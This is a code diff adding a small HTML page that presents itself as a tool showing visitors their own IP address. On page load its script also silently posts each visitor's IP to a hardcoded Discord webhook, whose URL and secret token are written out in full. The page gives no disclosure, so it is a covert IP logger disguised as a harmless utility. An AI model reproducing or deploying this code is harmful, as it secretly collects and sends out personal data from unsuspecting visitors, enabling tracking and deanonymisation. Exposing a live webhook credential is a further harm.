@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Show User IP</title>
+    <script>
+      function displayIP() {
+        fetch("https://api.ipify.org/?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            const ipElement = document.getElementById("ip");
+            ipElement.textContent = data.ip;
+            
+            sendToWebhook(data.ip);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+      
+      function sendToWebhook(ip) {
+        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
+        const message = "IP Address: " + ip;
+        
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        })
+        .then((response) => console.log("Webhook sent successfully"))
+        .catch((error) => console.error("Error sending webhook:", error));
+      }
+    </script>
+  </head>
+  <body onload="displayIP()">
+    <h1>Your IP Address:</h1>
+    <p id="ip">Loading...</p>
+  </body>
+</html>
